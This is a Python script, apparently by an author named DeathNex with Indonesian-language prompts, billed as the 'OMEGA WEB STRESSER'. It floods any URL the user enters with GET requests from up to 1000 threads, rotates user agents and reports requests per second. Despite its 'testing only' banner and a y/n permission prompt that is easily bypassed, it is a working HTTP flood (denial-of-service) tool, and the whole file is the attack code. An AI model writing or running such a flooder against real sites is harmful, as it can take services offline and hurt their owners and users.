#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════
#                    🔥 OMEGA WEB STRESSER 🔥
#                         BY: DeathNex
#              ⚠️  GUNAKAN HANYA UNTUK TESTING  ⚠️
# ═══════════════════════════════════════════════════════════════

import sys
import time
import random
import threading
import requests
import os

# Warna terminal (auto disable di Windows)
if os.name == 'nt':
    G = R = Y = B = C = W = BOLD = RESET = ''
else:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    B = '\033[94m'; C = '\033[96m'; W = '\033[97m'
    BOLD = '\033[1m'; RESET = '\033[0m'

# Banner
print(f"""{C}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                    🔥 OMEGA WEB STRESSER 🔥                      ║
║                         BY: DeathNex                             ║
║                   ⚠️  GUNAKAN DENGAN IZIN ⚠️                      ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")

# Input
target = input(f"{Y}[?] Target URL (http://...): {RESET}")
if not target.startswith(('http://', 'https://')):
    target = 'http://' + target

threads = int(input(f"{Y}[?] Jumlah thread (1-1000): {RESET}"))
duration = int(input(f"{Y}[?] Durasi (detik, 0=unlimited): {RESET}"))

# Validasi
if not any(x in target for x in ['localhost', '127.0.0.1', '192.168.', '10.']):
    print(f"\n{R}⚠️ PERINGATAN! Target bukan IP private!{RESET}")
    confirm = input(f"{Y}Anda memiliki izin? (y/n): {RESET}")
    if confirm.lower() != 'y':
        print(f"{R}❌ Dibatalkan.{RESET}")
        sys.exit()

# Header
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

# Stats
stats = {'total': 0, 'success': 0, 'failed': 0, 'running': True, 'start': 0}

def attack():
    session = requests.Session()
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    
    while stats['running']:
        try:
            r = session.get(target, headers=headers, timeout=3)
            stats['success'] += 1
        except:
            stats['failed'] += 1
        stats['total'] += 1

def monitor():
    while stats['running'] and duration > 0:
        time.sleep(1)
        if time.time() - stats['start'] >= duration:
            stats['running'] = False

print(f"\n{G}✓ Memulai attack ke {target}{RESET}")
print(f"{G}✓ Threads: {threads} | Duration: {duration}s{RESET}\n")

stats['start'] = time.time()

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

threading.Thread(target=monitor, daemon=True).start()

last = 0
try:
    while stats['running']:
        time.sleep(1)
        elapsed = int(time.time() - stats['start'])
        rps = stats['total'] - last
        last = stats['total']
        
        print(f"\r{G}📊 Total: {stats['total']:6} | ✅ Success: {stats['success']:6} | ❌ Failed: {stats['failed']:6} | ⚡ RPS: {rps:4} | ⏱️ {elapsed}s{RESET}", end='')
except KeyboardInterrupt:
    stats['running'] = False
    print()

print(f"\n\n{C}{BOLD}══════════ FINAL REPORT ══════════{RESET}")
print(f"{G}✅ Total Requests : {stats['total']}{RESET}")
print(f"{G}✅ Success        : {stats['success']}{RESET}")
print(f"{R}❌ Failed         : {stats['failed']}{RESET}")
rate = (stats['success']/stats['total']*100) if stats['total']>0 else 0
print(f"{Y}📈 Success Rate   : {rate:.2f}%{RESET}")
print(f"{Y}{BOLD}⚠️ Pastikan testing sesuai scope izin!{RESET}")